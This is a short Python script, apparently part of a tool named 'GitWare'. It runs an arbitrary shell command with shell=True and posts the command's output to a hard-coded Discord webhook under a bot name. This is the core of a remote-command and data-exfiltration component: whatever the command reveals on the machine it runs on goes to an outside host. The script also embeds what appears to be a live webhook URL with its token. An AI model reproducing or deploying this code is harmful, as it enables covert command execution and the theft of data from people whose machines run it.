import requests
import subprocess

webhook = "https://discord.com/api/webhooks/1463550423532306635/axb803n3IuP1d5Zr54EGHvfuemrph5VhKXTWBKMk-LhUps4aNI2AMKt-ukIS1v7XFeKp"
COMMAND = """e""" # Replace this with the command you want to execute.
result = subprocess.run(COMMAND, shell=True, capture_output=True, text=True)

data = {
    "content": f"""Result to the command: `{COMMAND}`
    ```{result.stdout}``` """,
    "username": "GitWare Bot",
    "avatar":"https://github.com/meph15t/GitWare/blob/main/resources/gitware_symbol.png?raw=true"
}   
response = requests.post(webhook, json=data)
